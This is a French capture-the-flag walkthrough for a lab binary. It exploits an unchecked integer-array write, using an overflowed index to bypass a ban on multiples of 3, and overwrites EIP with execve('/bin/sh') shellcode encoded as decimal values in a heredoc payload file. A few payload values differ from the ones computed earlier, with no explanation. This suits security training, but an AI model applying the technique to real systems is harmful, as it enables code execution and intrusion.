La fonction store_number ecrit dans un tableau de int de taille 100 mais sans aucune verification ce qui veut dire
qu'on peut ecrire ou on veut

on va d'abord trouver l'offset pour acceder a eip. On procede a taton a partir de 100

sachant qu'on nous empeche d'ecrire des index en multiple de 3 on va bypass ca en s'appuyant sur le fait que la machine est
en 32 bits. 

1073741824 = 0x40000000

On sait que :

0x40000000 << 2 = 0x100000000

et en 32 bits :
0x100000000 → 0
Donc :
1073741824
se comporte comme :
index 0

donc pour les multiple de 3 on va partir de 1073741824

apres quelque essai je trouve que le bon index pour atteindre eip est 114 qui est un multiple de 3 donc on passe plutot par 1073741938 (1073741824 + 114)

on va utiliser un shell code :

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

mais ce shell code devra etre transformer en decimal pour le faire entrer dans notre tableau


31 c0 50 68 => 0x6850c031 => 1750122545
2f 2f 73 68 => 0x68732f2f => 1752379183
68 2f 62 69 => 0x69622f68 => 1768042344
6e 89 e3 89 => 0x89e3896e => 2313398638
c1 89 c2 b0 => 0xb0c289c1 => 2965531073
0b cd 80 31 => 0x3180cd0b => 830524683
c0 40 cd 80 => 0x80cd40c0 => 2160939200

il ne reste plus qu'a trouver l'adresse du debut du buffer

on lance gdb avec un breakpoint au niveau de la fonction read_number

(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8
0xffffd520:	0xffffd544

on voit que l'adresse de la premiere case du tableau est 0xffffd544 et que cette adresse est stocke a 0xffffd520

on pourrait se dire qu'on doit prendre directement l'adresse 0xffffd520 mais non car en faisant cette execution avec gdb
les adresse ne seront pas pareil en execution reel

donc on fait 0xffffd520 - 0xffffd544 = 0x24 = 36
36 / 4 = 9

donc l'adresse du tableau est 9 octect avant le tableau

on lance le progamme seul :

read
index : -9

on obtient 4294956388

tout est pret pour l'exploit

cat > /tmp/payload.txt << 'EOF'
store
2425393296
1073741824
store
2425393296
1
store
2425393296
2
store
2425393296
1073741827
store
1750122545
4
store
1752379183
5
store
1768042344
1073741830
store
2313390446
7
store
2965539265
8
store
830524683
1073741833
store
2160935104
10
store
4294956388
1073741938
quit
EOF

